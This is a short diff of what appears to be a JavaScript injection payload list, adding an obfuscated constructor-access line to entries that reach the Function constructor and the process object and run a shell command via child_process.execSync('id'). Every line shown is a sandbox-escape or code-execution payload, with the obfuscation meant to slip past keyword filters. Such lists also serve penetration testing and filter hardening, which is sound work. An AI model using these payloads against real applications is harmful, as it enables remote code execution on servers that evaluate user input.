@@ -24,4 +24,5 @@ require('child_process').execSync('id').toString();
 ({}).constructor.constructor
 [].filter.constructor
 ({}).constructor.constructor === Function
+[].filter["con"+"structor"]
 [].filter["con"+"structor"]("return pro"+"cess")();
